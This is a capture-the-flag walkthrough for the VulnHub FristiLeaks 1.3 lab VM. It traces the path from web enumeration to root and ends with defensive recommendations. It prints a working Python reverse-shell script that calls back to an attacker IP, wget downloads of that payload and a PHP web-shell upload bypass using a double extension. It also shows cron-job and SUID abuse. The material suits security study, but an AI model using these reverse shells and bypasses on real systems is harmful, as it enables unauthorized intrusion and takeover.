# Fristi Leaks CTF - Complete Walkthrough

## Overview

**VM Name:** Fristi Leaks 1.3  
**Source:** [VulnHub](https://www.vulnhub.com/entry/fristileaks-13,133/)  
**Difficulty:** Basic  
**Objective:** Get root (uid 0) and read the flag file  
**Style:** Enumeration/Follow the breadcrumbs

This CTF challenges participants to discover hidden directories through pattern recognition, exploit file upload vulnerabilities, abuse cron jobs, decrypt passwords, and leverage SUID binaries to achieve root access.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Application Analysis](#2-web-application-analysis)
3. [Credential Discovery](#3-credential-discovery)
4. [Initial Access](#4-initial-access)
5. [Privilege Escalation - Admin User](#5-privilege-escalation---admin-user)
6. [Privilege Escalation - Fristigod User](#6-privilege-escalation---fristigod-user)
7. [Privilege Escalation - Root Access](#7-privilege-escalation---root-access)
8. [Flag](#8-flag)

---

## 1. Reconnaissance

### Network Scanning

Initial network discovery using Nmap to identify the target:

```bash
nmap -sV -sC -p- 10.0.2.13
```

**Key Findings:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 80   | Open  | HTTP    | Apache httpd 2.2.15 (CentOS) DAV/2 PHP/5.3.3 |

**Target IP:** `10.0.2.13`

**Notable Scan Results:**
- robots.txt file discovered with 3 disallowed entries: `/cola`, `/sisi`, `/beer`
- Outdated software stack (PHP 5.3.3, Apache 2.2.15)
- Directory indexing enabled on `/icons/` and `/images/`

### Web Vulnerability Scan

```bash
nikto -h http://10.0.2.13
```

**Significant Discoveries:**
- Server may leak inodes via ETags
- HTTP TRACE method active (XST vulnerability)
- Multiple security headers missing (X-Frame-Options, X-Content-Type-Options)
- Outdated PHP and Apache versions with known CVEs

---

## 2. Web Application Analysis

### Initial Web Enumeration

Accessing the main page and checking robots.txt:

```bash
curl http://10.0.2.13/robots.txt
```

**Content:**
```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

### Critical Insight - Pattern Recognition

All disallowed entries in robots.txt are beverage names:
- **cola** - Carbonated soft drink
- **sisi** - Dutch orange soda
- **beer** - Alcoholic beverage

The CTF name "**Fristi**" is also a beverage - a Dutch yogurt drink brand!

### Hidden Directory Discovery

Testing the pattern:

```
http://10.0.2.13/fristi/
```

**Result:** 🎯 "Welcome to #fristileaks admin portal"

This demonstrates the importance of thinking laterally when analyzing seemingly random information. The beverage theme was the key clue.

---

## 3. Credential Discovery

### Source Code Analysis

Inspecting the admin portal source code:

```bash
view-source:http://10.0.2.13/fristi/
```

**Key Findings:**

1. **Base64-encoded data in HTML comments** - A large base64 string embedded in the source
2. **Username hint** - "eezeepz" mentioned in description text

### Decoding the Base64 Data

```bash
# Extract base64 string to file
echo "iVBORw0KGgoAAAANSUhEUgAAAW0AAAD..." > base64.txt

# Attempt to decode
base64 -d base64.txt
```

The output appears to be binary data. Checking the file signature reveals it's a PNG image:

```bash
# Save as PNG image
base64 -d base64.txt > base64.png

# Open the image
```

**Password revealed in image:** `keKkeKKeKKeKkEkkEk`

### Valid Credentials

- **Username:** `eezeepz`
- **Password:** `keKkeKKeKKeKkEkkEk`

Successfully authenticated to the admin portal!

---

## 4. Initial Access

### File Upload Interface

After login, an upload interface is available at:
```
http://10.0.2.13/fristi/upload.php
```

### File Upload Exploitation

**Prepare reverse shell:**

```bash
# Copy PHP reverse shell template
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# Edit configuration
nano shell.php
```

**Modify these lines:**
```php
$ip = '10.0.2.6';    // Attacker IP
$port = 1234;         // Listener port
```

### Bypassing Upload Filter

**Initial attempt:**
```
Upload: shell.php
Result: "Sorry, is not a valid file. Only allowed are: png,jpg,gif"
```

The application validates file extensions. Testing double extension bypass:

```
Rename: shell.php → shell.php.png
Upload: shell.php.png
Result: Success! ✓
```

File uploaded to: `/fristi/uploads/shell.php.png`

### Triggering the Shell

**Attacker machine:**
```bash
nc -nvlp 1234
```

**Trigger execution:**
```bash
curl http://10.0.2.13/fristi/uploads/shell.php.png
```

**Connection received:**
```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 38562
sh-4.1$ whoami
apache
```

Successfully obtained shell as the `apache` user!

### System Enumeration

```bash
# Check shell limitations
sh-4.1$ echo $SHELL
/sbin/nologin

# Enumerate users with bash access
cat /etc/passwd | grep /bin/bash
```

**Users with bash:**
- root
- mysql
- eezeepz
- admin
- fristigod

### Discovering Cron Job Information

```bash
cd /home/eezeepz
cat notes.txt
```

**Critical note content:**
```
Yo EZ,
I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/
Don't forget to specify the full path for each binary!
Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.
- Jerry
```

**Key information:**
- Cron job runs every minute as `admin` user
- Executes commands from `/tmp/runthis`
- Allows binaries from `/usr/bin/*`

---

## 5. Privilege Escalation - Admin User

### Strategy

Abuse the cron job to execute a Python reverse shell as the `admin` user.

### Creating the Payload

**Attacker machine - Create Python reverse shell:**

```python
# prs.py
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.6", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

**Start HTTP server:**
```bash
python3 -m http.server --bind 10.0.2.6
```

### Deploying the Exploit

**Target machine:**
```bash
# Download payload
cd /tmp
wget http://10.0.2.6:8000/prs.py

# Create cron trigger
echo "/usr/bin/python /tmp/prs.py" > /tmp/runthis
```

**Attacker machine - Start listener:**
```bash
nc -nvlp 4444
listening on [any] 4444 ...
```

### Admin Shell Received

After ~1 minute (cron execution):

```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 50004
bash: no job control in this shell
[admin@localhost ~]$ whoami
admin
```

Successfully escalated to `admin` user! 🎉

### Enumerating Admin Home Directory

```bash
[admin@localhost ~]$ ls -la
```

**Interesting files discovered:**
- `cryptedpass.txt` - Encrypted password
- `cryptpass.py` - Encryption script
- `whoisyourgodnow.txt` - Another encrypted password
- Custom binaries (cat, chmod, df, echo, grep, etc.)

### Analyzing Encrypted Passwords

```bash
[admin@localhost ~]$ cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

[admin@localhost ~]$ cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

[admin@localhost ~]$ cat cryptpass.py
```

**Encryption script:**
```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

**Encryption method identified:**
1. Base64 encode
2. Reverse the string
3. ROT13 encode

### Decrypting the Passwords

**Attacker machine - Create decryption script:**

```python
# decrypt.py
import base64
import codecs
import sys

def decodeString(s):
    rot13_decoded = codecs.decode(s[::-1], 'rot_13')    # ROT13 decode + reverse
    base64_decoded = base64.b64decode(rot13_decoded)    # base64 decode
    return base64_decoded.decode()

cryptResult = decodeString(sys.argv[1])
print(cryptResult)
```

**Decrypt passwords:**

```bash
python3 decrypt.py "=RFn0AKnlMHMPIzpyuTI0ITG"
# Output: LetThereBeFristi!

python3 decrypt.py "mVGZ3O3omkJLmy2pcuTq"
# Output: thisisalsopw123
```

**Credentials obtained:**
- `fristigod`: LetThereBeFristi!
- `admin`: thisisalsopw123

---

## 6. Privilege Escalation - Fristigod User

### Switching Users

```bash
# Spawn TTY first (required for su command)
[admin@localhost ~]$ python -c 'import pty; pty.spawn("/bin/bash")'

# Switch to fristigod
[admin@localhost ~]$ su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
fristigod
```

### File System Enumeration

```bash
bash-4.1$ find / -user fristigod 2>/dev/null
```

**Key findings:**
```
/var/fristigod
/var/fristigod/.secret_admin_stuff
/var/fristigod/.secret_admin_stuff/doCom
```

### Analyzing Bash History

```bash
bash-4.1$ cat /var/fristigod/.bash_history
```

**Important commands in history:**
```bash
cd .secret_admin_stuff/
./doCom
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
```

The bash history reveals that `doCom` can be executed with sudo!

### Examining the SUID Binary

```bash
bash-4.1$ cd /var/fristigod/.secret_admin_stuff
bash-4.1$ ls -l

total 8
-rwsr-sr-x 1 root root 7529 Nov 25 2015 doCom
```

**Critical finding:** The binary has the SUID bit set and is owned by root!

### Testing doCom Functionality

```bash
bash-4.1$ sudo -u fristi ./doCom ls /
[sudo] password for fristigod: LetThereBeFristi!

bin   dev  home  lib64       media  opt   root  selinux  sys  usr
boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
```

The `doCom` binary executes arbitrary commands - this is our path to root!

---

## 7. Privilege Escalation - Root Access

### Strategy

Use `doCom` to execute a Python reverse shell with root privileges.

**Attacker machine - Start listener:**
```bash
nc -nvlp 4445
listening on [any] 4445 ...
```

### Deploying Root Shell

**Target machine:**
```bash
bash-4.1$ cd /var/fristigod/.secret_admin_stuff

# Download reverse shell (modified for port 4445)
bash-4.1$ wget http://10.0.2.6:8000/prs.py

# Execute through doCom with sudo
bash-4.1$ sudo -u fristi ./doCom /usr/bin/python prs.py
```

### Root Shell Obtained

**Attacker machine:**
```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.13] 51710

bash-4.1# whoami
root

bash-4.1# id
uid=0(root) gid=0(root) groups=0(root),100(users)
```

Complete system compromise achieved! 🏆

---

## 8. Flag

### Capturing the Flag

```bash
bash-4.1# cd /root
bash-4.1# ls -la

total 16
dr-xr-x---  2 root root 4096 Nov 19  2015 .
dr-xr-xr-x 22 root root 4096 Nov 19  2015 ..
-rw-r--r--  1 root root  214 Nov 18  2015 fristileaks_secrets.txt

bash-4.1# cat fristileaks_secrets.txt
```

**Flag content:**
```
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

**FLAG:** `Y0u_kn0w_y0u_l0ve_fr1st1`

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Weak Directory Enumeration Protection**
   - Pattern recognition required to discover `/fristi/` directory
   - robots.txt provided clues through beverage naming theme

2. **Information Disclosure**
   - Base64-encoded password embedded in HTML source
   - Username revealed in page comments

3. **Insufficient File Upload Validation**
   - Extension-based filtering easily bypassed with double extension
   - No content-type or magic number validation

4. **Insecure Cron Job Implementation**
   - World-writable trigger file with elevated execution
   - No input validation or integrity checks

5. **Weak Cryptography**
   - Custom encryption scheme easily reversible
   - Encrypted passwords stored in readable files

6. **SUID Binary Misconfiguration**
   - `doCom` binary allows arbitrary command execution as root
   - No input sanitization or restrictions

### Attack Chain Summary

```
Nmap Reconnaissance
    ↓
Pattern Recognition (robots.txt → /fristi/)
    ↓
Source Code Analysis (base64 password)
    ↓
Authentication (eezeepz:keKkeKKeKKeKkEkkEk)
    ↓
File Upload Bypass (shell.php.png)
    ↓
Initial Access (apache user)
    ↓
Cron Job Discovery (notes.txt)
    ↓
Cron Job Abuse (/tmp/runthis)
    ↓
Admin User Access
    ↓
Password Decryption (ROT13 + Base64 reversal)
    ↓
User Switch (fristigod)
    ↓
SUID Binary Discovery (doCom)
    ↓
Root Privilege Escalation
    ↓
Flag Capture
```

### Security Recommendations

1. **Web Application Security**
   - Never embed credentials or sensitive data in HTML source
   - Implement proper file upload validation (magic numbers, file size, content scanning)
   - Use Content Security Policy headers
   - Regular security code reviews

2. **Authentication & Cryptography**
   - Use industry-standard hashing algorithms (bcrypt, Argon2)
   - Never use reversible encryption for passwords
   - Implement secure session management
   - Multi-factor authentication for admin access

3. **File System Security**
   - Audit and remove unnecessary SUID/SGID binaries
   - Strict file permissions (principle of least privilege)
   - Regular file integrity monitoring

4. **Cron Job Security**
   - Avoid world-writable trigger files
   - Implement input validation
   - Use absolute paths
   - Proper logging and monitoring

5. **System Hardening**
   - Keep software updated with security patches
   - Remove unnecessary services
   - Implement intrusion detection systems
   - Follow CIS security benchmarks

---

## Tools Used

- **Nmap** - Network scanning and service enumeration
- **Nikto** - Web server vulnerability scanner
- **curl** - HTTP requests and file retrieval
- **base64** - Decoding encoded content
- **Python** - Reverse shell and decryption scripts
- **Netcat** - Reverse shell listener
- **wget** - File download utility

---

## References

- VulnHub: https://www.vulnhub.com/entry/fristileaks-13,133/
- OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- GTFOBins: https://gtfobins.github.io/
- OWASP Top 10: https://owasp.org/www-project-top-ten/

---

## Author

**0xCr0nu5**  
Connect with me: [GitHub](https://github.com/0xCr0nu5)

---

*Disclaimer: This writeup is for educational purposes only. Always obtain proper authorization before testing security on any system.*
